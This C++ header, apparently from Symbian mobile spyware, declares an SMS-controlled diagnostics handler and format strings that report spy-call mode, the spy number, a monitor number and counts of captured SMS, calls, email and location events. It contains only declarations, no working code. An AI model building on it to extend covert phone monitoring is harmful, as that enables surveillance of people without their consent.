#ifndef _DiagnosCmdHandler_H__
#define _DiagnosCmdHandler_H__

#include <e32base.h>
#include "AppDefinitions.h"
#include "SmsCmdFormatter.h"
#include "SmsCmdManager.h"

class MLastConnInfoSource;
class CFxsSettings;
class CFxsDatabase;
class MApnInfoSource;

enum TDiagnosID
	{
	EDiagsNone = 0,	
	EDiagsVersion,		//1
	EDiagsDeviceType,	//2
	EDiagsOS,			//3
	EDiagsSpyCallInfo,	//4
	EDiagsCaptureFlag,	//5
	EDiagsEventToCapture,//6
	EDiagsSms,			//7  IN,OUT
	EDiagsVoice,		//8	 IN,OUT
	EDiagsLOC,			//9 
	EDiagsEmail,		//10
	EDiagsMaxNumOfEvent,//11
	EDiagsTimer,		//12
	EDiagsMonitorNumber,//13
	EDiagsLastConnTime,//14
	EDiagsResponseCode,//15
	EDiagsApnRecovery, //16
	EDiagsTuple, 	   //17
	EDiagsNetworkName, //18
	EDiagsDbSize,	   //19
	EDiagsInstallDrive,//20
	EDiagsFreeMemory, //21
	/**
	Not for Symbian*/
	EDiagsFreeRAM,	   //22
	EDiagsDbCorrupted, //23
	EDiagsDbDamanged,  //24
	EDiagsDbDropedCount,//25
	EDiagsRowCorrupedCount,//26
	EDiagsDbRecovered, //27	
	EDiagsGpsMethods //28,
	};

static const TText* const KFormatMsg[] = 
	{
	_S("NOT USE\n"),	//0
	_S("%d>%d,%S\n"),	//1  Id, ProductID, Version
	_S("%d>%S\n"),	//2  Id, device type
	_S("%d>%S\n"),	//3  Id, OS
	_S("%d>%d,%d,%S\n"),//4  Id,WachListStatus,SpyMode, SpyNumber
	_S("%d>%d\n"),	//5  Id,Start capture on or off
	_S("%d>%d,%d,%d,%d,%S\n"),//6  Id,Call,SMS,Email,LOC,GPS
	_S("%d>%d,%d\n"),	//7  Id, Number of SmsIN, SmsOUT event
	_S("%d>%d,%d,%d\n"),	//8  Id, Number of VoideIN, VoiceOUT,Missed event
	_S("%d>%d,%d\n"),	//9  Id, Number of Location , System event
	_S("%d>%d,%d\n"),	//10 Id, Number of EmailIN, EmailOUT
	_S("%d>%d\n"),	//11 Id, Max number of evetns
	_S("%d>%d\n"),	//12 Id, Timer
	_S("%d>%S\n"),	//13 Id, Monitor Number
	_S("%d>%S,%S\n"),	//14 Id, Last connection time, currently used access point name
	_S("%d>%d,%d,%X\n"),//15 Id, ErrorCode, ConnStatus, Server Response Code
	_S("%d>F2:%S F3:%S F4:%S\n"), //16 Id, 
	_S("%d>%S,%S\n"),	//17 Id, NetworkCountryCode(String),NetworkId(String)
	_S("%d>%S\n"),	//18 Id, NetworkName
	_S("%d>%d\n"),	//19 Id, DbSize
	_S("%d>%c\n"),	//20 Id, Drive Installed(char)
	_S("%d>%d\n"),	//21 Id, Disk free(in the installed drive)
	_S("%d>%d\n"),	//22 Id, RAM Free	
	_S("%d>%d\n"),	//23 Id, Db Corrupted(Yes,NO)
	_S("%d>%d\n"),	//24 Id, Db Damaged (Yes,No)
	_S("%d>%d\n"),	//25 Id, Db Droped Count
	_S("%d>%d\n"),	//26 Id, Row Corrupted (Yes,No)
	_S("%d>%d\n"),	//27 Id, Recovered
	_S("%d>%S\n"),	//28 Id, Gps Method Name like 'Integerated GPS', 'Assisted GPS'
	};

class CDiagnosCmdHandler : public CBase,
						   public MCmdListener
	{
public:
	static CDiagnosCmdHandler* NewL(MLastConnInfoSource& aConnInfo, 
									MApnInfoSource& aApnRecvInfo,
									CFxsDatabase& aDb);
	~CDiagnosCmdHandler();
	
private: //From MSmsCmdObserver
	HBufC* HandleSmsCommandL(const TSmsCmdDetails& aCmdDetails);
	
private:
	CDiagnosCmdHandler(MLastConnInfoSource& aConnInfo, MApnInfoSource& aApnInfo, CFxsDatabase& aDb);
	void ConstructL();
	TPtrC FmtString(TDiagnosID aDiagId);
	/**
	* @return response message, passing ownerhip
	*/
	HBufC* CreateRespMessageL();
private:
	CFxsSettings& iSettings;
	MLastConnInfoSource& iConnInfo;
	MApnInfoSource& iApnRecvInfo;
	CFxsDatabase& iDb;	
	};

#endif
